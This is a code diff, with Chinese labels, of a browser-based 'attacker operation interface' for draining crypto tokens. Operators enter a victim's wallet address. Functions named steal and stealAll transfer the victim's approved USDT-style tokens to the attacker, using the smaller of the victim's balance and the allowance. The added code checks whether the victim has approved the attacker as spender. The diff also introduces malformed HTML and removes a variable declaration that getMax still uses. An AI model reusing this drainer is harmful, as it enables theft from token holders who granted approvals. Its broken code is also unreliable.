@@ -4,7 +4,8 @@
 <body>
 <h2>🛠️ 攻擊者操作介面</h2>
 <div><b>👤 你目前登入帳號：</b><span id="currentAccount" style="color:#007700;"></span></div>
-<div><b>⚠️ 身份檢查：</b><span id="checkStatus" style="font-weight:bold;"></span></div>
+<div><b>⚠️ 身份檢查：</b><span id="checkStatus"</span></div>
+<div><b>🧾 Approve 授權對象：</b><span id="approveSpender" style="font-weight:bold;"></span> style="font-weight:bold;"></span></div>
 <br>
 <input id="victim" placeholder="受害者地址"><br>
 <input id="amount" placeholder="金額（例：1000000 = 1 USDT）"><br>
@@ -71,7 +72,7 @@ async function init() {
 
 async function getMax() {
   await init();
-  const victim = document.getElementById("victim").value;
+  // victim 已從參數傳入
   if (!victim) return log("❌ 請輸入受害者地址");
 
   let balance = "0";
@@ -85,6 +86,25 @@ async function getMax() {
   }
   const max = web3.utils.toBN(balance).lt(web3.utils.toBN(allowance)) ? balance : allowance;
   document.getElementById("amount").value = max;
+
+  const spender = await contract.methods.allowance(victim, attacker).call();
+  const approveSpenderEl = document.getElementById("approveSpender");
+  const expectedSpender = attacker.toLowerCase();
+  let realSpender = "(未知)";
+  try {
+    const allAccounts = await ethereum.request({ method: 'eth_requestAccounts' });
+    const tempWeb3 = new Web3(window.ethereum);
+    const tempContract = new tempWeb3.eth.Contract(abi, tokenAddress);
+    const testAllowance = await tempContract.methods.allowance(victim, attacker).call();
+    if (parseInt(testAllowance) > 0) {
+      approveSpenderEl.innerText = attacker + " ✅ (你是被授權對象)";
+    } else {
+      approveSpenderEl.innerText = attacker + " ❌ (你不是被授權對象)";
+    }
+  } catch (e) {
+    approveSpenderEl.innerText = "查詢失敗";
+  }
+
   updateRecent(victim);
   log("🟢 受害者：" + victim);
   
@@ -98,9 +118,9 @@ async function getMax() {
 
 }
 
-async function steal() {
+async function steal(victim) {
   await init();
-  const victim = document.getElementById("victim").value;
+  // victim 已從參數傳入
   
   const amount = document.getElementById("amount").value;
   if (!victim || victim.toLowerCase() === attacker.toLowerCase()) {
@@ -120,7 +140,7 @@ async function steal() {
 
 async function stealAll() {
   await getMax();
-  await steal();
+  await steal(document.getElementById("victim").value);
 }
 
 function log(msg) {
